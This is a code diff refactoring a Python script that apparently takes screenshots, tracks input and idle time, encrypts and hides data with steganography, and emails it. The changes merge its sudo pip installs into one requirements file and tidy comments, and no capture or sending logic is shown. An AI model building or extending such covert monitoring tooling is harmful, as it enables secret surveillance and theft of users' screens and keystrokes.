@@ -25,8 +25,6 @@ import ssl
 input_key = '', False
 method_key = False
 
-# INSTALLATION CORE
-
 
 def installation():
     # Installations
@@ -34,16 +32,8 @@ def installation():
     print(f'\nSetting configuration to {system()}.\n')
     sleep(1)
     try:
-        os.system('pip install cryptography' if os.name ==
-                  'nt' else 'sudo pip3 install cryptography')
-        os.system('pip install pyautogui' if os.name ==
-                  'nt' else 'sudo pip3 install pyautogui')
-        os.system('pip install stegano' if os.name ==
-                  'nt' else 'sudo pip3 install stegano')
-        os.system('pip install pynput' if os.name ==
-                  'nt' else 'sudo pip3 install pynput')
-        os.system('pip install tqdm' if os.name ==
-                  'nt' else 'sudo pip3 install tqdm')
+        os.system('pip install -r requirements.txt' if os.name ==
+                  'nt' else 'sudo pip3 install -r requirements.txt')
 
         if os.name == 'posix':
             os.system('sudo apt-get install scrot')
@@ -55,13 +45,9 @@ def installation():
     finally:
         return initialize_import
 
-# LAST INPUT INFO
-
 
 class LASTINPUTINFO(Structure):
     _fields_ = [('cbSize', c_uint), ('dwTime', c_uint), ]
-
-# TIMING
 
 
 class Timing:
@@ -87,8 +73,6 @@ class Timing:
             dx = day_sec * d
         return dx - (day_sec - (int(h) * 3600 + int(m) * 60))
 
-# TEMPORARY DIRECTORY
-
 
 class Temporary_Directory:
     def __init__(self):
@@ -108,8 +92,6 @@ class Temporary_Directory:
         rmtree(temp_dir)
         print(f'{temp_dir} closed\n')
 
-# CRYPTOGRAPHY
-
 
 class Cryptography:
     def __init__(self):
@@ -128,8 +110,6 @@ class Cryptography:
         cipher = Fernet(KEY)
         decrypted_text = (cipher.decrypt(encrypted_text)).decode()
         return decrypted_text
-
-# SCREENSHOTS
 
 
 class Screenshots:
@@ -166,10 +146,10 @@ class Screenshots:
         elif self.method == 'click':
             pass
 
-# SEND MESSAGES
-
 
 class EMAIL:
+    '''send messages'''
+
     def __init__(self, message, user):
         self.message = message
         self.user = user
